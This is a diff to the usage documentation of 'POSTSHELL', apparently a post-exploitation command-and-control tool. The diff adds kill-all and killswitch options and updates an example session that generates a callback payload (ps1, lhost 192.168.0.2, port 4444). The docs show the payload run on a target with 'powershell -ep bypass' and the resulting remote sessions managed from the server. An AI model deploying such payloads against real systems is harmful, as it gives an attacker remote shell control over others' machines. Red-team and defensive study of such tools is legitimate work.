@@ -57,23 +57,27 @@ List commands
 postshell> help 
 
 Menu Commands:
-    help | ?            - Show this menu
-    list                - List connected sessions
-    select <id>         - Connect to a session
-    kill <id>           - Terminate session
-    exit                - Exit the server
+    help | ?             - Show this menu
+    list                 - List connected sessions
+    select <id>          - Connect to a session
+    kill <id>            - Terminate session
+    killall		 - Terminate all sessions
+    exit                 - Exit the server
 Session Commands:
-    background          - Background session
-    die                 - Terminate session
+    background           - Background session
+    die                  - Terminate session
 Payload Menu Commands:
-    set lhost <ip>      - Set the POSTSHELL IP address
-    set lport <port>    - Set the POSTSHELL listening port
-    set payload <type>  - Set payload type (EX: sh, py, ps1)
-    set checkin <sec>   - Set the check-in wait time (in seconds)
-    options             - Show current payload configuration
-    generate            - Generate the payload with current settings
-    back                - Return to the main menu
-    help                - Show this help menu 
+    set name <name>      - Set CUSTOM script name | BLANK = DEFAULT
+    set lhost <ip>       - Set the POSTSHELL IP address
+    set lport <port>     - Set the POSTSHELL listening port
+    set payload <type>   - Set payload type (EX: sh, py, ps1)
+    set checkin <sec>    - Set the check-in wait time (in seconds)
+    set killswitch <sec> - Exit payload if offline for N seconds
+    options              - Show current payload configuration
+    generate             - Generate the payload with current settings
+    back                 - Return to the main menu
+    help                 - Show this help menu
+
 ```
 
 Generate a Client script that creates a directory called "tools" with the scripts
@@ -90,29 +94,33 @@ Current Payload Options:
   LPORT     : 80
   PAYLOAD   : sh
   CHECKIN   : 1
+  KILLSWITCH: 60
 
-payload> set name client
+payload> set name callme
 [+] Set 'name' to 'client'
-payload> set lhost 192.168.0.1
-[+] Set 'lhost' to '192.168.0.1'
-payload> set lport 81
-[+] Set 'lport' to '81'
-payload> set payload py
-[+] Set 'payload' to 'py'
+payload> set lhost 192.168.0.2
+[+] Set 'lhost' to '192.168.0.2'
+payload> set lport 4444
+[+] Set 'lport' to '4444'
+payload> set payload ps1
+[+] Set 'payload' to 'ps1'
 payload> set checkin 2
 [+] Set 'checkin' to '2'
+payload> set killswitch 10
+[+] Set 'killswitch' to '10'
 payload> options 
 
 Current Payload Options:
 
   NAME      : client
-  LHOST     : 192.168.0.1
-  LPORT     : 81
-  PAYLOAD   : py
+  LHOST     : 192.168.0.2
+  LPORT     : 4444
+  PAYLOAD   : ps1
   CHECKIN   : 2
+  KILLSWITCH: 10
 
 payload> generate 
-[+] Payload generated and saved as 'tools/client.py'
+[+] Payload generated and saved as 'tools/client.ps1'
 ```
 
 Transfer the client script
@@ -126,7 +134,7 @@ Execute the script on the client
 ```
 bash client.sh
 
-python3 client.py
+python3 client.py 
 
 powershell -ep bypass client.ps1
 ```
@@ -187,7 +195,13 @@ postshell> kill 1
 [!] Sent kill command to luke@SKYWALKER
 ```
 
-Kill all sessions, and exit POSTSHELL
+Kill all sessions
+```
+postshell> killall
+[!] Terminating all sessions.
+```
+
+Exit POSTSHELL
 ```
 postshell> exit 
 [!] Shutting down server and all sessions.
